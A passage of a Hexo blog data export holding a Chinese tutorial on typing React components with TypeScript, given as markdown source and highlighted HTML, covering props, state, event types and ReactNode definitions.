title=\"链接\"></a>链接</h2><ul>\n<li><p><a href=\"https://typicode.github.io/husky/#/\">husky官文文档</a></p>\n</li>\n<li><p><a href=\"https://typicode.github.io/husky/#/\">lint-staged官方文档</a></p>\n</li>\n<li><p><a href=\"https://juejin.cn/post/6844903831893966856\">Cz工具集使用介绍</a></p>\n</li>\n</ul>"},{"title":"在 React 项目中优雅地使用 Typescript","date":"2021-04-19T08:00:33.000Z","_content":"{% img /gallery/react+ts.png %}\nTypeScript 是 Javascript 的超集，扩展了 JavaScript 的语法，给 JavaScript 带来了静态类型支持，了解如何在 React 项目中优雅地使用 Typescript，能帮助我们写出更优雅的代码。\n\n<!-- more -->\n\n「优雅」的含义：\n\n - 减少编写冗余的类型定义、类型标注，充分利用ts的自动类型推断，以及外部提供的类型声明。\n - 类型安全：提供足够的类型信息来避免运行时错误，让错误暴露在开发期。这些类型信息同时能够提供代码补全、跳转到定义等功能。\n\n## 组件定义\n\n### 函数组件\n\n```tsx\nimport * as React from 'react';\n// 如果在tsconfig中设置了\"allowSyntheticDefaultImports\": true\n// 你还可以更精练地import react：\n// import React from \"react\";\n\ninterface IProps {\n      // CSSProperties提供样式声明的类型信息\n      // 用户传入style的时候就能够获得类型检查和代码补全\n      style?: React.CSSProperties;\n      // 使用@types/react提供的事件类型定义，这里指定event.target的类型是HTMLButtonElement\n      onClick(event: React.MouseEvent<HTMLButtonElement>): void;\n    // ...\n}\nconst MyComponent: React.FC<IProps> = (props) => {\n      const { children, ...restProps } = props;\n    return <div {...restProps}>{children}</div>;\n}\n```\n\n- FC是FunctionComponent的缩写。\n- IProps无需声明children属性的类型。React.FC会自动为props添加这个属性类型。\n  当然，如果children期望一个render prop，或者期望其他特殊的值，那么你还是要自己给children声明类型，而不是使用默认 \n  的React.ReactNode。\n- props无需做类型标注。\n\n#### 函数组件defaultProps（Deprecate）\n\n如果你需要定义defaultProps，那么不要使用React.FC，因为[React.FC对defaultProps的支持不是很好](https://github.com/typescript-cheatsheets/react#typing-defaultprops)：\n\n```tsx\nconst defaultProps = {\n  who: \"Johny Five\"\n};\ntype IProps = { age: number } & typeof defaultProps;\n\nexport const Greet = (props: IProps) => { return <div>123</div> };\nGreet.defaultProps = defaultProps;\n```\n\n事实上，[一个提议在函数组件中废弃defaultProps的React rfc已经被接受](https://github.com/reactjs/rfcs/blob/createlement-rfc/text/0000-create-element-changes.md#deprecate-defaultprops-on-function-components)，所以以后还是尽量减少在函数组件上使用defaultProps，使用ES6原生的参数解构+默认参数特性就已经能够满足需要：\n\n```tsx\nconst TestFunction: FunctionComponent<Props> = ({ foo = \"bar\" }) => <div>{foo}</div>\n```\n\n### 类组件\n\n```tsx\ninterface IProps {\n  message: string;\n}\ninterface IState {\n  count: number;\n}\nexport class MyComponent extends React.Component<IProps, IState> {\n  state: IState = {\n    // duplicate IState annotation for better type inference\n    count: 0\n  };\n  render() {\n    return (\n      <div>\n        {this.props.message} {this.state.count}\n      </div>\n    );\n  }\n}\n```\n\n- 如果你通过声明state属性来初始化state，那么你需要为这个属性增加IState类型标注。虽然这与前面的React.Component<IProps, IState>有重复的嫌疑，但是这两者实际上是不同的：\n    - React.Component<IProps, IState>只是标注了基类的state属性类型。\n    - 而当你在子类声明state时，你可以为state标注一个【IState的子类型】作为override。这样，this.state会以子类中的state属性声明作为类型信息的来源。\n- 建议使用函数组件。\n\n\n## 可渲染节点类型\n\n可渲染节点就是：可以直接被组件渲染函数返回的值。\n\n与可渲染节点有关的类型定义如下（摘录自[@types/react](https://github.com/DefinitelyTyped/DefinitelyTyped/blob/8a1b68be3a64e5d2aa1070f68cc935d668a976ad/types/react/index.d.ts#L187）：\n\n```ts\ntype ReactText = string | number;\ntype ReactChild = ReactElement | ReactText;\ninterface ReactNodeArray extends Array<ReactNode> {}\ntype ReactFragment = {} | ReactNodeArray;\ntype ReactNode = ReactChild | ReactFragment | ReactPortal | boolean | null | undefined;\n```\n\n## 组件类型\n\n- `React.FC<Props>`（即 `React.FunctionComponent<Props>`）\n- `React.Component<Props, State>`\n- `React.ComponentType<Props>`（即`ComponentClass<P> | FunctionComponent<P>`）\n\n在写HOC的时候经常用到。\n\n```tsx\nconst withState = <P extends WrappedComponentProps>(\n  WrappedComponent: React.ComponentType<P>,\n) => { ...\n```\n\n## 获取并扩展原生元素的props类型\n\n比如，以下例子获取并扩展了`<button>`的props类型：\n\n```tsx\nexport const PrimaryButton = (\n  props: Props & React.HTMLProps<HTMLButtonElement>\n) => <Button size={ButtonSizes.default} {...props} />;\n```\n\nPrimaryButton能够接受所有原生`<button>`所接受的`props`。关键在于`React.HTMLProps`。\n\n## 获取并扩展第三方组件的props类型\n\n```tsx\nimport { Button } from \"library\"; // but doesn't export ButtonProps! oh no!\ntype ButtonProps = React.ComponentProps<typeof Button>; // no problem! grab your own!\ntype AlertButtonProps = Omit<ButtonProps, \"onClick\">; // modify\nconst AlertButton: React.FC<AlertButtonProps> = props => (\n  <Button onClick={() => alert(\"hello\")} {...props} />\n);\n```\n\n## 事件类型\n\n`@types/react`提供了各种事件的类型，比如以下是使用`React.FormEvent`的例子：\n\n```tsx\nclass App extends React.Component<\n  {},\n  {\n    text: string\n  }\n> {\n  state = {\n    text: '',\n  }\n  onChange = (e: React.FormEvent<HTMLInputElement>): void => {\n    this.setState({ text: e.currentTarget.value })\n  }\n  render() {\n    return (\n      <div>\n        <input type=\"text\" value={this.state.text} onChange={this.onChange} />\n      </div>\n    )\n  }\n}\n```\n\n在React中，所有事件（包括[FormEvent](https://reactjs.org/docs/events.html#form-events)、[KeyboardEvent](https://reactjs.org/docs/events.html#keyboard-events)、[MouseEvent](https://reactjs.org/docs/events.html#mouse-events)等）都是[SyntheticEvent](https://reactjs.org/docs/events.html)的子类型。他们在@types/react中定义如下：\n\n```tsx\n// DOM事件的基本属性都定义在这里\ninterface BaseSyntheticEvent<E = object, C = any, T = any> {\n  nativeEvent: E;\n  currentTarget: C;\n  target: T;\n  bubbles: boolean;\n  cancelable: boolean;\n  defaultPrevented: boolean;\n  eventPhase: number;\n  isTrusted: boolean;\n  preventDefault(): void;\n  isDefaultPrevented(): boolean;\n  stopPropagation(): void;\n  isPropagationStopped(): boolean;\n  persist(): void;\n  timeStamp: number;\n  type: string;\n}\ninterface SyntheticEvent<T = Element, E = Event> extends BaseSyntheticEvent<E, EventTarget & T, EventTarget> {}\n\n// 具体的事件类型：\ninterface FormEvent<T = Element> extends SyntheticEvent<T> {}\ninterface KeyboardEvent<T = Element> extends SyntheticEvent<T, NativeKeyboardEvent> {\n  altKey: boolean;\n  // ...\n}\ninterface MouseEvent<T = Element, E = NativeMouseEvent> extends SyntheticEvent<T, E> {\n  altKey: boolean;\n  // ...\n}\n// ...\n```\n\n\n\n\n","source":"_posts/在React项目中优雅地使用Typescript.md","raw":"---\ntitle: 在 React 项目中优雅地使用 Typescript\ndate: 2021-04-19 16:00:33\ntags:\n---\n{% img /gallery/react+ts.png %}\nTypeScript 是 Javascript 的超集，扩展了 JavaScript 的语法，给 JavaScript 带来了静态类型支持，了解如何在 React 项目中优雅地使用 Typescript，能帮助我们写出更优雅的代码。\n\n<!-- more -->\n\n「优雅」的含义：\n\n - 减少编写冗余的类型定义、类型标注，充分利用ts的自动类型推断，以及外部提供的类型声明。\n - 类型安全：提供足够的类型信息来避免运行时错误，让错误暴露在开发期。这些类型信息同时能够提供代码补全、跳转到定义等功能。\n\n## 组件定义\n\n### 函数组件\n\n```tsx\nimport * as React from 'react';\n// 如果在tsconfig中设置了\"allowSyntheticDefaultImports\": true\n// 你还可以更精练地import react：\n// import React from \"react\";\n\ninterface IProps {\n      // CSSProperties提供样式声明的类型信息\n      // 用户传入style的时候就能够获得类型检查和代码补全\n      style?: React.CSSProperties;\n      // 使用@types/react提供的事件类型定义，这里指定event.target的类型是HTMLButtonElement\n      onClick(event: React.MouseEvent<HTMLButtonElement>): void;\n    // ...\n}\nconst MyComponent: React.FC<IProps> = (props) => {\n      const { children, ...restProps } = props;\n    return <div {...restProps}>{children}</div>;\n}\n```\n\n- FC是FunctionComponent的缩写。\n- IProps无需声明children属性的类型。React.FC会自动为props添加这个属性类型。\n  当然，如果children期望一个render prop，或者期望其他特殊的值，那么你还是要自己给children声明类型，而不是使用默认 \n  的React.ReactNode。\n- props无需做类型标注。\n\n#### 函数组件defaultProps（Deprecate）\n\n如果你需要定义defaultProps，那么不要使用React.FC，因为[React.FC对defaultProps的支持不是很好](https://github.com/typescript-cheatsheets/react#typing-defaultprops)：\n\n```tsx\nconst defaultProps = {\n  who: \"Johny Five\"\n};\ntype IProps = { age: number } & typeof defaultProps;\n\nexport const Greet = (props: IProps) => { return <div>123</div> };\nGreet.defaultProps = defaultProps;\n```\n\n事实上，[一个提议在函数组件中废弃defaultProps的React rfc已经被接受](https://github.com/reactjs/rfcs/blob/createlement-rfc/text/0000-create-element-changes.md#deprecate-defaultprops-on-function-components)，所以以后还是尽量减少在函数组件上使用defaultProps，使用ES6原生的参数解构+默认参数特性就已经能够满足需要：\n\n```tsx\nconst TestFunction: FunctionComponent<Props> = ({ foo = \"bar\" }) => <div>{foo}</div>\n```\n\n### 类组件\n\n```tsx\ninterface IProps {\n  message: string;\n}\ninterface IState {\n  count: number;\n}\nexport class MyComponent extends React.Component<IProps, IState> {\n  state: IState = {\n    // duplicate IState annotation for better type inference\n    count: 0\n  };\n  render() {\n    return (\n      <div>\n        {this.props.message} {this.state.count}\n      </div>\n    );\n  }\n}\n```\n\n- 如果你通过声明state属性来初始化state，那么你需要为这个属性增加IState类型标注。虽然这与前面的React.Component<IProps, IState>有重复的嫌疑，但是这两者实际上是不同的：\n    - React.Component<IProps, IState>只是标注了基类的state属性类型。\n    - 而当你在子类声明state时，你可以为state标注一个【IState的子类型】作为override。这样，this.state会以子类中的state属性声明作为类型信息的来源。\n- 建议使用函数组件。\n\n\n## 可渲染节点类型\n\n可渲染节点就是：可以直接被组件渲染函数返回的值。\n\n与可渲染节点有关的类型定义如下（摘录自[@types/react](https://github.com/DefinitelyTyped/DefinitelyTyped/blob/8a1b68be3a64e5d2aa1070f68cc935d668a976ad/types/react/index.d.ts#L187）：\n\n```ts\ntype ReactText = string | number;\ntype ReactChild = ReactElement | ReactText;\ninterface ReactNodeArray extends Array<ReactNode> {}\ntype ReactFragment = {} | ReactNodeArray;\ntype ReactNode = ReactChild | ReactFragment | ReactPortal | boolean | null | undefined;\n```\n\n## 组件类型\n\n- `React.FC<Props>`（即 `React.FunctionComponent<Props>`）\n- `React.Component<Props, State>`\n- `React.ComponentType<Props>`（即`ComponentClass<P> | FunctionComponent<P>`）\n\n在写HOC的时候经常用到。\n\n```tsx\nconst withState = <P extends WrappedComponentProps>(\n  WrappedComponent: React.ComponentType<P>,\n) => { ...\n```\n\n## 获取并扩展原生元素的props类型\n\n比如，以下例子获取并扩展了`<button>`的props类型：\n\n```tsx\nexport const PrimaryButton = (\n  props: Props & React.HTMLProps<HTMLButtonElement>\n) => <Button size={ButtonSizes.default} {...props} />;\n```\n\nPrimaryButton能够接受所有原生`<button>`所接受的`props`。关键在于`React.HTMLProps`。\n\n## 获取并扩展第三方组件的props类型\n\n```tsx\nimport { Button } from \"library\"; // but doesn't export ButtonProps! oh no!\ntype ButtonProps = React.ComponentProps<typeof Button>; // no problem! grab your own!\ntype AlertButtonProps = Omit<ButtonProps, \"onClick\">; // modify\nconst AlertButton: React.FC<AlertButtonProps> = props => (\n  <Button onClick={() => alert(\"hello\")} {...props} />\n);\n```\n\n## 事件类型\n\n`@types/react`提供了各种事件的类型，比如以下是使用`React.FormEvent`的例子：\n\n```tsx\nclass App extends React.Component<\n  {},\n  {\n    text: string\n  }\n> {\n  state = {\n    text: '',\n  }\n  onChange = (e: React.FormEvent<HTMLInputElement>): void => {\n    this.setState({ text: e.currentTarget.value })\n  }\n  render() {\n    return (\n      <div>\n        <input type=\"text\" value={this.state.text} onChange={this.onChange} />\n      </div>\n    )\n  }\n}\n```\n\n在React中，所有事件（包括[FormEvent](https://reactjs.org/docs/events.html#form-events)、[KeyboardEvent](https://reactjs.org/docs/events.html#keyboard-events)、[MouseEvent](https://reactjs.org/docs/events.html#mouse-events)等）都是[SyntheticEvent](https://reactjs.org/docs/events.html)的子类型。他们在@types/react中定义如下：\n\n```tsx\n// DOM事件的基本属性都定义在这里\ninterface BaseSyntheticEvent<E = object, C = any, T = any> {\n  nativeEvent: E;\n  currentTarget: C;\n  target: T;\n  bubbles: boolean;\n  cancelable: boolean;\n  defaultPrevented: boolean;\n  eventPhase: number;\n  isTrusted: boolean;\n  preventDefault(): void;\n  isDefaultPrevented(): boolean;\n  stopPropagation(): void;\n  isPropagationStopped(): boolean;\n  persist(): void;\n  timeStamp: number;\n  type: string;\n}\ninterface SyntheticEvent<T = Element, E = Event> extends BaseSyntheticEvent<E, EventTarget & T, EventTarget> {}\n\n// 具体的事件类型：\ninterface FormEvent<T = Element> extends SyntheticEvent<T> {}\ninterface KeyboardEvent<T = Element> extends SyntheticEvent<T, NativeKeyboardEvent> {\n  altKey: boolean;\n  // ...\n}\ninterface MouseEvent<T = Element, E = NativeMouseEvent> extends SyntheticEvent<T, E> {\n  altKey: boolean;\n  // ...\n}\n// ...\n```\n\n\n\n\n","slug":"在React项目中优雅地使用Typescript","published":1,"updated":"2022-03-06T08:40:48.283Z","_id":"cl0eyp64y0003hommco9w7pcw","comments":1,"layout":"post","photos":[],"link":"","content":"<html><head></head><body><img src=\"/gallery/react+ts.png\" class=\"\">\n<p>TypeScript 是 Javascript 的超集，扩展了 JavaScript 的语法，给 JavaScript 带来了静态类型支持，了解如何在 React 项目中优雅地使用 Typescript，能帮助我们写出更优雅的代码。</p>\n<span id=\"more\"></span>\n\n<p>「优雅」的含义：</p>\n<ul>\n<li>减少编写冗余的类型定义、类型标注，充分利用ts的自动类型推断，以及外部提供的类型声明。</li>\n<li>类型安全：提供足够的类型信息来避免运行时错误，让错误暴露在开发期。这些类型信息同时能够提供代码补全、跳转到定义等功能。</li>\n</ul>\n<h2 id=\"组件定义\"><a href=\"#组件定义\" class=\"headerlink\" title=\"组件定义\"></a>组件定义</h2><h3 id=\"函数组件\"><a href=\"#函数组件\" class=\"headerlink\" title=\"函数组件\"></a>函数组件</h3><figure class=\"highlight tsx hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"hljs-keyword\">import</span> * <span class=\"hljs-keyword\">as</span> <span class=\"title class_\">React</span> <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'react'</span>;</span><br><span class=\"line\"><span class=\"hljs-comment\">// 如果在tsconfig中设置了\"allowSyntheticDefaultImports\": true</span></span><br><span class=\"line\"><span class=\"hljs-comment\">// 你还可以更精练地import react：</span></span><br><span class=\"line\"><span class=\"hljs-comment\">// import React from \"react\";</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"hljs-keyword\">interface</span> <span class=\"title class_\">IProps</span> {</span><br><span class=\"line\">      <span class=\"hljs-comment\">// CSSProperties提供样式声明的类型信息</span></span><br><span class=\"line\">      <span class=\"hljs-comment\">// 用户传入style的时候就能够获得类型检查和代码补全</span></span><br><span class=\"line\">      style?: <span class=\"title class_\">React</span>.<span class=\"hljs-property\">CSSProperties</span>;</span><br><span class=\"line\">      <span class=\"hljs-comment\">// 使用@types/react提供的事件类型定义，这里指定event.target的类型是HTMLButtonElement</span></span><br><span class=\"line\">      <span class=\"title function_\">onClick</span>(<span class=\"hljs-attr\">event</span>: <span class=\"title class_\">React</span>.<span class=\"hljs-property\">MouseEvent</span>&lt;<span class=\"title class_\">HTMLButtonElement</span>&gt;): <span class=\"hljs-built_in\">void</span>;</span><br><span class=\"line\">    <span class=\"hljs-comment\">// ...</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"hljs-keyword\">const</span> <span class=\"title class_\">MyComponent</span>: <span class=\"title class_\">React</span>.<span class=\"hljs-property\">FC</span>&lt;<span class=\"title class_\">IProps</span>&gt; = <span class=\"hljs-function\">(<span class=\"hljs-params\">props</span>) =&gt;</span> {</span><br><span class=\"line\">      <span class=\"hljs-keyword\">const</span> { children, ...restProps } = props;</span><br><span class=\"line\">    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-language-xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> {<span class=\"hljs-attr\">...restProps</span>}&gt;</span>{children}<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span></span>;</span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure>\n\n<ul>\n<li>FC是FunctionComponent的缩写。</li>\n<li>IProps无需声明children属性的类型。React.FC会自动为props添加这个属性类型。<br>当然，如果children期望一个render prop，或者期望其他特殊的值，那么你还是要自己给children声明类型，而不是使用默认<br>的React.ReactNode。</li>\n<li>props无需做类型标注。</li>\n</ul>\n<h4 id=\"函数组件defaultProps（Deprecate）\"><a href=\"#函数组件defaultProps（Deprecate）\" class=\"headerlink\" title=\"函数组件defaultProps（Deprecate）\"></a>函数组件defaultProps（Deprecate）</h4><p>如果你需要定义defaultProps，那么不要使用React.FC，因为<a href=\"https://github.com/typescript-cheatsheets/react#typing-defaultprops\">React.FC对defaultProps的支持不是很好</a>：</p>\n<figure class=\"highlight tsx hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"hljs-keyword\">const</span> defaultProps = {</span><br><span class=\"line\">  <span class=\"hljs-attr\">who</span>: <span class=\"hljs-string\">\"Johny Five\"</span></span><br><span class=\"line\">};</span><br><span class=\"line\"><span class=\"hljs-keyword\">type</span> <span class=\"title class_\">IProps</span> = { <span class=\"hljs-attr\">age</span>: <span class=\"hljs-built_in\">number</span> } &amp; <span class=\"hljs-keyword\">typeof</span> defaultProps;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"hljs-keyword\">export</span> <span class=\"hljs-keyword\">const</span> <span class=\"title function_\">Greet</span> = (<span class=\"hljs-params\">props: IProps</span>) =&gt; { <span class=\"hljs-keyword\">return</span> <span class=\"hljs-language-xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span>&gt;</span>123<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span></span> };</span><br><span class=\"line\"><span class=\"title class_\">Greet</span>.<span class=\"hljs-property\">defaultProps</span> = defaultProps;</span><br></pre></td></tr></tbody></table></figure>\n\n<p>事实上，<a href=\"https://github.com/reactjs/rfcs/blob/createlement-rfc/text/0000-create-element-changes.md#deprecate-defaultprops-on-function-components\">一个提议在函数组件中废弃defaultProps的React rfc已经被接受</a>，所以以后还是尽量减少在函数组件上使用defaultProps，使用ES6原生的参数解构+默认参数特性就已经能够满足需要：</p>\n<figure class=\"highlight tsx hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"hljs-keyword\">const</span> <span class=\"title class_\">TestFunction</span>: <span class=\"title class_\">FunctionComponent</span>&lt;<span class=\"title class_\">Props</span>&gt; = <span class=\"hljs-function\">(<span class=\"hljs-params\">{ foo = <span class=\"hljs-string\">\"bar\"</span> }</span>) =&gt;</span> <span class=\"hljs-language-xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span>&gt;</span>{foo}<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span></span></span><br></pre></td></tr></tbody></table></figure>\n\n<h3 id=\"类组件\"><a href=\"#类组件\" class=\"headerlink\" title=\"类组件\"></a>类组件</h3><figure class=\"highlight tsx hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"hljs-keyword\">interface</span> <span class=\"title class_\">IProps</span> {</span><br><span class=\"line\">  <span class=\"hljs-attr\">message</span>: <span class=\"hljs-built_in\">string</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"hljs-keyword\">interface</span> <span class=\"title class_\">IState</span> {</span><br><span class=\"line\">  <span class=\"hljs-attr\">count</span>: <span class=\"hljs-built_in\">number</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"hljs-keyword\">export</span> <span class=\"hljs-keyword\">class</span> <span class=\"title class_\">MyComponent</span> <span class=\"hljs-keyword\">extends</span> <span class=\"title class_ inherited__\">React.Component</span>&lt;<span class=\"title class_\">IProps</span>, <span class=\"title class_\">IState</span>&gt; {</span><br><span class=\"line\">  <span class=\"hljs-attr\">state</span>: <span class=\"title class_\">IState</span> = {</span><br><span class=\"line\">    <span class=\"hljs-comment\">// duplicate IState annotation for better type inference</span></span><br><span class=\"line\">    <span class=\"hljs-attr\">count</span>: <span class=\"hljs-number\">0</span></span><br><span class=\"line\">  };</span><br><span class=\"line\">  <span class=\"title function_\">render</span>(<span class=\"hljs-params\"></span>) {</span><br><span class=\"line\">    <span class=\"hljs-keyword\">return</span> (</span><br><span class=\"line\">      <span class=\"hljs-language-xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"hljs-language-xml\">        {this.props.message} {this.state.count}</span></span><br><span class=\"line\"><span class=\"hljs-language-xml\">      <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span></span></span><br><span class=\"line\">    );</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure>\n\n<ul>\n<li>如果你通过声明state属性来初始化state，那么你需要为这个属性增加IState类型标注。虽然这与前面的React.Component&lt;IProps, IState&gt;有重复的嫌疑，但是这两者实际上是不同的：<ul>\n<li>React.Component&lt;IProps, IState&gt;只是标注了基类的state属性类型。</li>\n<li>而当你在子类声明state时，你可以为state标注一个【IState的子类型】作为override。这样，this.state会以子类中的state属性声明作为类型信息的来源。</li>\n</ul>\n</li>\n<li>建议使用函数组件。</li>\n</ul>\n<h2 id=\"可渲染节点类型\"><a href=\"#可渲染节点类型\" class=\"headerlink\" title=\"可渲染节点类型\"></a>可渲染节点类型</h2><p>可渲染节点就是：可以直接被组件渲染函数返回的值。</p>\n<p>与可渲染节点有关的类型定义如下（摘录自[@types/react](<a href=\"https://github.com/DefinitelyTyped/DefinitelyTyped/blob/8a1b68be3a64e5d2aa1070f68cc935d668a976ad/types/react/index.d.ts#L187%EF%BC%89%EF%BC%9A\">https://github.com/DefinitelyTyped/DefinitelyTyped/blob/8a1b68be3a64e5d2aa1070f68cc935d668a976ad/types/react/index.d.ts#L187）：</a></p>\n<figure class=\"highlight ts hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"hljs-keyword\">type</span> <span class=\"title class_\">ReactText</span> = <span class=\"hljs-built_in\">string</span> | <span class=\"hljs-built_in\">number</span>;</span><br><span class=\"line\"><span class=\"hljs-keyword\">type</span> <span class=\"title class_\">ReactChild</span> = <span class=\"title class_\">ReactElement</span> | <span class=\"title class_\">ReactText</span>;</span><br><span class=\"line\"><span class=\"hljs-keyword\">interface</span> <span class=\"title class_\">ReactNodeArray</span> <span class=\"hljs-keyword\">extends</span> <span class=\"title class_\">Array</span>&lt;<span class=\"title class_\">ReactNode</span>&gt; {}</span><br><span class=\"line\"><span class=\"hljs-keyword\">type</span> <span class=\"title class_\">ReactFragment</span> = {} | <span class=\"title class_\">ReactNodeArray</span>;</span><br><span class=\"line\"><span class=\"hljs-keyword\">type</span> <span class=\"title class_\">ReactNode</span> = <span class=\"title class_\">ReactChild</span> | <span class=\"title class_\">ReactFragment</span> | <span class=\"title class_\">ReactPortal</span> | <span class=\"hljs-built_in\">boolean</span> | <span class=\"hljs-literal\">null</span> | <span class=\"hljs-literal\">undefined</span>;</span><br></pre></td></tr></tbody></table></figure>\n\n<h2 id=\"组件类型\"><a href=\"#组件类型\" class=\"headerlink\" title=\"组件类型\"></a>组件类型</h2><ul>\n<li><code>React.FC&lt;Props&gt;</code>（即 <code>React.FunctionComponent&lt;Props&gt;</code>）</li>\n<li><code>React.Component&lt;Props, State&gt;</code></li>\n<li><code>React.ComponentType&lt;Props&gt;</code>（即<code>ComponentClass&lt;P&gt; | FunctionComponent&lt;P&gt;</code>）</li>\n</ul>\n<p>在写HOC的时候经常用到。</p>\n<figure class=\"highlight tsx hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"hljs-keyword\">const</span> withState = &lt;P <span class=\"hljs-keyword\">extends</span> <span class=\"title class_\">WrappedComponentProps</span>&gt;<span class=\"hljs-function\">(<span class=\"hljs-params\"></span></span></span><br><span class=\"line\"><span class=\"hljs-params\"><span class=\"hljs-function\">  WrappedComponent: React.ComponentType&lt;P&gt;,</span></span></span><br><span class=\"line\"><span class=\"hljs-params\"><span class=\"hljs-function\"></span>) =&gt;</span> { ...</span><br></pre></td></tr></tbody></table></figure>\n\n<h2 id=\"获取并扩展原生元素的props类型\"><a href=\"#获取并扩展原生元素的props类型\" class=\"headerlink\" title=\"获取并扩展原生元素的props类型\"></a>获取并扩展原生元素的props类型</h2><p>比如，以下例子获取并扩展了<code>&lt;button&gt;</code>的props类型：</p>\n<figure class=\"highlight tsx hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"hljs-keyword\">export</span> <span class=\"hljs-keyword\">const</span> <span class=\"title function_\">PrimaryButton</span> = (<span class=\"hljs-params\"></span></span><br><span class=\"line\"><span class=\"hljs-params\">  props: Props &amp; React.HTMLProps&lt;HTMLButtonElement&gt;</span></span><br><span class=\"line\"><span class=\"hljs-params\"></span>) =&gt; <span class=\"hljs-language-xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">Button</span> <span class=\"hljs-attr\">size</span>=<span class=\"hljs-string\">{ButtonSizes.default}</span> {<span class=\"hljs-attr\">...props</span>} /&gt;</span></span>;</span><br></pre></td></tr></tbody></table></figure>\n\n<p>PrimaryButton能够接受所有原生<code>&lt;button&gt;</code>所接受的<code>props</code>。关键在于<code>React.HTMLProps</code>。</p>\n<h2 id=\"获取并扩展第三方组件的props类型\"><a href=\"#获取并扩展第三方组件的props类型\" class=\"headerlink\" title=\"获取并扩展第三方组件的props类型\"></a>获取并扩展第三方组件的props类型</h2><figure class=\"highlight tsx hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"hljs-keyword\">import</span> { <span class=\"title class_\">Button</span> } <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">\"library\"</span>; <span class=\"hljs-comment\">// but doesn't export ButtonProps! oh no!</span></span><br><span class=\"line\"><span class=\"hljs-keyword\">type</span> <span class=\"title class_\">ButtonProps</span> = <span class=\"title class_\">React</span>.<span class=\"hljs-property\">ComponentProps</span>&lt;<span class=\"hljs-keyword\">typeof</span> <span class=\"title class_\">Button</span>&gt;; <span class=\"hljs-comment\">// no problem! grab your own!</span></span><br><span class=\"line\"><span class=\"hljs-keyword\">type</span> <span class=\"title class_\">AlertButtonProps</span> = <span class=\"title class_\">Omit</span>&lt;<span class=\"title class_\">ButtonProps</span>, <span class=\"hljs-string\">\"onClick\"</span>&gt;; <span class=\"hljs-comment\">// modify</span></span><br><span class=\"line\"><span class=\"hljs-keyword\">const</span> <span class=\"title class_\">AlertButton</span>: <span class=\"title class_\">React</span>.<span class=\"hljs-property\">FC</span>&lt;<span class=\"title class_\">AlertButtonProps</span>&gt; = <span class=\"hljs-function\"><span class=\"hljs-params\">props</span> =&gt;</span> (</span><br><span class=\"line\">  <span class=\"hljs-language-xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">Button</span> <span class=\"hljs-attr\">onClick</span>=<span class=\"hljs-string\">{()</span> =&gt;</span> alert(\"hello\")} {...props} /&gt;</span></span><br><span class=\"line\">);</span><br></pre></td></tr></tbody></table></figure>\n\n<h2 id=\"事件类型\"><a href=\"#事件类型\" 